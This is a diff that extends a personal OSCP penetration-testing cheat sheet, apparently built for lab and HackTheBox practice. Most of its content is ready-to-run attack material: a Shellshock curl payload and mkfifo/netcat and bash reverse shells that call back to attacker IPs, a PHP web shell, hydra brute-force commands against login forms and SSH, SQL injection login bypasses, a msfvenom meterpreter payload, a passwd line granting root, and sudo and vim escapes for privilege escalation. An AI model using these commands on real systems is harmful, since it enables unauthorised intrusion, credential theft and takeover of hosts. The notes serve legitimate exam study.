@@ -2,10 +2,11 @@ PERSONAL OSCP NOTES ~Kunal Patel
 ==-==-==-==-==-==-==-==-==-==-==
 
 Cyberchef --> website that allows decoding and encoding of various stuffs like ssh(RSA,cipher),jpg etc
+https://obsproject.com/ --> to capture the screen while exam
 
-==================
-Nmap: Port Scanner 
-===================
+====
+Nmap
+====
 nmap -A -p- -T4 192.168.6.145
 nmap -sV 192.168.20.10-12 -oA bookversionnmap
 nmap -sS -T4 -A [IP]
@@ -87,6 +88,9 @@ Exploiting PUT method
 Curl, Cadaver, nmap, Poster(firefox-addon), Burpsuit, Metasploit....
 all of these can be used to upload reverse_shell on to the victim machine.
 
+Firest check what file types are allowed on server using devtest
+	davtest -url http://10.10.10.14
+
 Curl is Command line tool 
 	curl http://192.168.6.103/dav/ --upload-file /root/Desktop/shell.php -v
 
@@ -129,6 +133,16 @@ sslscan 10.11.1.111:443
 ./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
 nmap -sV --script=ssl-heartbleed 192.168.101.8
 
+===========
+Login-Panel
+===========
+Always try with default creds first admin:nibles, root:root, admin:admin etc
+Logged-in or not, also try in ssh with user root or any other
+Try sql injections
+If username is valid but password invalid use hydra to bruteforce
+	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V -f http-post-form '/department/login.php:username=^USER^&password=^PASS^:invalid password'
+Try to find unauthenticated exploit 
+
 ===============
 base 64 stuffs
 ===============
@@ -148,6 +162,8 @@ nslookup  www.google.com
 dig axfr @192.168.6.136 kioprio.com
 dig axfr @192.168.6.136 kioprio.com > zonetransfer  (For saving the output into zonetransfer file)
 
+host -l cronos.htb 10.10.10.13
+
 dig axfr @192.168.6.136 kioprio2.com
 dig axfr @192.168.6.136 kioprio2.com >> zonetransfer (For appending/updating the same file we use double >> )
 
@@ -155,6 +171,7 @@ dig @10.10.176.179 bookface.com -t TXT
 	to find flag2 with TXT header 
 
 dig -x <host> # reverses lookup host
+
 ==========================================
 Automating websites checking from dns res
 ========================================== 
@@ -292,9 +309,9 @@ to download files from victim machine to kali
 
 	meterpreter > download \openssh.gzip /root/Desktop/
 
-=================
+===========================
 SNMP Enumeration (PORT 161)
-=================
+===========================
 snmp is common in windows machines
 
 snmpwalk -c public -v2c 10.10.10.116
@@ -325,6 +342,16 @@ So now we can use defaultNamingContext with ldapsearch
 
 also use enum4linux to grab usernames and other important information
 
+==========
+Shellshock
+==========
+Let's say we found a file user.sh on victim's server under cgi-bin, 
+which is vulnerable to shell shock attack
+We can get a reverse_shell using metasploit 
+	"use exploit/multi/http/apache_mod_cgi_bash_env_exec"
+Or without metasploit by using CURL
+	curl -A '() { :; }; /bin/bash -i > /dev/tcp/10.10.14.14/9000 0<&1 2>&1' http://10.10.10.56/cgi-bin/user.sh
+
 ===========
 finger (79)
 ===========
@@ -349,23 +376,25 @@ Login to ssh
 	ssh root@10.10.10.16
 
 Login to ssh via private key
-	ssh -i isakey.key user@10.10.10.146
+	ssh -i id_rsa user@10.10.10.146
 	 (Also it might ask for passphrase, use ssh2john and crack it) 
-	 to copy isa_key from user (You need access to user :p)
-		copy from /home/root/.ssh/isa.key (But for that we first need the access to victim to steal the private key :)
+	 to copy id_rsa from user (You need access to user :p)
+		copy from /home/root/.ssh/id_rsa (But for that we first need the access to victim to steal the private key :)
 	
 Bruteforcing the ssh
 	hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.151 ssh -t 4
 		-l is the user name 
 		-P is the word file
+			~Use -L for user.txt file
 		
 Copying Files from ssh shell
 	Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
+		On Kali
 		scp -i id_rsa willow@10.10.154.10:user.jpg flag.jpg	
 			~~It saves user.jpg from victim machine to flag.jpg in kali	
 
-If ssh runs on other port (like 9920)
-	ssh -p 9920 kunal@10.10.10.10
+If ssh runs on other port (like 920)
+	ssh -p 920 kunal@10.10.10.10
 	
 If ssh is filtered by a proxy lets say on port 3128 run this on kali
 	proxytunnel -p {Victim_IP}:3128 -d 127.0.0.1:22 -a 1234
@@ -377,6 +406,20 @@ If ssh is filtered by a proxy lets say on port 3128 run this on kali
 ```
 nc 10.11.1.111 22
 
+
+=================
+SSH Port knocking
+=================
+On Victim 
+	cat /etc/knockd.conf
+	to find out how to open and close ssh, but you need an initial shell
+	if found 
+	[openSSH]
+	sequence = 571, 290, 911
+		Use nmap to scan in order to unlock (OPEN) ssh
+		for x in 571 290 911 22; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done
+If you do nmap scan in reverse order (22 911 290 571) It Locks the SSH port again
+	
 ===========
 SMTP (25)
 ===========
@@ -414,9 +457,11 @@ Ftp anonymous login allowed
 	name: anonymous
 	ftp:> dir
 	
-	If nothing shows type maybe file is hidden
+	If nothing shows maybe file is hidden use
 	ftp:> ls -lah
 	
+	To Download file from ftp to kali
+	ftp:> mget file.txt
 	
 Bruteforce FTP with user jerry
 	hydra -l jerry -P /usr/share/wordlists/rockyou.txt 10.10.176.179 ftp
@@ -434,16 +479,22 @@ So here is how to generate a password
 And it will create a user name kunal with password patel
 
 kunal:$xxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash                   (where xxxxx is encrypted password)
+kunal:$1$kunal$WNZN7hI3wo2fKty5US.q40:0:0:root:/root:/bin/bash
 
 ========
 exiftool
 ========
+First try to run strings even on image
+then use exiftool
 exiftool is a tool that extracts metadata from images
 binwalk is also a tool that extracts data from images	
 	If theres a zip file inside a image
 		use: binwalk -e image.jpg
 		And it will extract zip file inside a "_xxxx" Folder
-		
+	
+steghide info irked.jpg
+steghide extract -sf irked.jpg -p 
+	
 =============
 SQL INJECTION
 =============
@@ -452,6 +503,8 @@ SQL INJECTION
 		'
 		' or '1'='1
 		' || 1=1# 
+		admin' #
+		admin' or '1'='1
 		%' or '0'='0
 		
 ### Sql-login-bypass
@@ -482,16 +535,35 @@ SQL INJECTION
 
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 
+
+
+======================
+Padding oracle attack
+======================
+If you login to a website, and that website has a cookie.
+You try changing the cookie value and invalid padding error occurs
+Then u can use padbuster tool to get the cookie of admin
+https://exp1o1t9r.com/2020/01/31/hackthebox-lazy-writeup/
+
 =============
 REVERSE SHELL
 ============= 
 attacker(host)          nc -nvlp 4444
+
+
+First upload 
+	<?php echo system($_REQUEST["cmd"]); ?> as rev.php
+Then execute
+	rev.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.14+920+>/tmp/f
+
 
 http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.6.134%204444%27)};%23
 
 
 if found PING SEARCHBOX in website then use below command to get reverse shell
 	; bash -i >& /dev/tcp/192.168.6.148/4444 0>&1
+	or
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 5555 >/tmp/f
  
 
 ====================
@@ -617,7 +689,7 @@ Reverse Shell payload using msfvenom
 		set payload php/meterpreter/reverse_tcp
 		exploit
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 EXITFUNC=thread -f aspx > rev.aspx
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -f asp > rev.asp
 
 msfconsole
 use exploit/multi/handler
@@ -688,6 +760,8 @@ sudo apt-get install fcrackzip
 RarCrack by David Zoltan Kedves is a simple bruteforce zip,7-zip and rar password cracker.
 sudo apt-get install rarcrack
 
+If found an encrypted cipher message use rumkin to decrypt
+	rumkin.com/tools/cipher
 
 crackstation.net
 hashes.com
@@ -812,12 +886,13 @@ priv escalation
 - Inside service
 - World writable scripts invoked by root
 - Unmounted filesystems
-- Look in /var/backups
+- Look in /var/backups or /backups (if any readable file present)
 - Look in /etc/fstab y en mount
 Less likely
 - Private ssh keys
 - Bad path configuration
 - Cronjobs
+- Look in /var/html/{SERVICE} (any service running might be vulnerable so search on exploit-db)
 
 netstat -antp   (Shows which ports/ip machine is listening to)
 netstat -ano
@@ -850,6 +925,10 @@ TO FIND EXECUTABLES WHICH HAVE SUID BIT SET USE
 	find / -perm -u=s -type f 2>/dev/null
 
 FIND CRON TABS
+-------------
+	cat /etc/crontab
+	also run pspy would help
+
 linpeas.sh
 linuxprivchecker.py     linPrivchecker.sh     Linexploitchecker.sh
 
@@ -883,6 +962,7 @@ giving us the reverse shell as root.
 # SUID
 ---------
 find / -perm -4000 -type f 2>/dev/null
+find / -uid 0 -perm -4000 -type f 2>/dev/null
 
 # ALL PERMS
 ------------
@@ -1011,6 +1091,8 @@ RVIM
 	sudo rvim -c ":py3 import pty; pty.spawn('/bin/bash')"
 	!bash
 	id
+VIM
+	vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 	
 -----------------------------------------------------------	
 sudo -l for weak permissions gives you root using GTFOBINS
@@ -1141,7 +1223,7 @@ For eg: If /bin/bash can be run as (ALL, !root)
 
 -----------------
 Windows privesc
------------------
+-------------------------------
 (1: Windows-Exploit-Suggester)
 -------------------------------
 On Victim
@@ -1158,9 +1240,32 @@ On Kali
 	python windows-exploit-suggester.py --database xxxx.xlsx --systeminfo systeminfo.txt 
 
 
+-------------------------
+(2: Unquoted Servie Path)
+-------------------------
+ Run powerup.ps1 
+	add Invoke-AllChecks in last line of ps1 script so you don't have to write it all times
+	Results:
+		Let's assume it Shows Unquoted Service Path: c:\Program Filers\Deploy Ready\Service Files\Deploy.exe
+		It is vulnerable because is it not in quoted inverted commas("") i.e "C:\..."
+		So when this program runs
+			It goes into c:\Program Files and executes Program.exe
+			Then it goes on to Deploy Ready folder and executes Deploy.exe
+			Then it goes on to Service Files folder and executes Service.exe
+			and so on....
+		
+	So we can create our own Service.exe with msfvenom and place it in "Deploy Ready" folder
+	And then 
+		sc start Deploy	
 
+---------------
+(3: Hot Potato)
+---------------
+Never touch a potato when it's hot :P
 
-
+	Easy to privesc and capture
+	
+	
 ===============
 port forwarding
 ===============
@@ -1266,3 +1371,9 @@ to transfer on windows using powershell
 		or using cert util
 		certutil -urlcache -f http://10.10.14.5/4120.exe root.exe
 		
+==============
+Bash Scripting
+==============
+for i in 4444 920 4455; do
+nmap -T4 -p $i 10.10.10.12
+done;
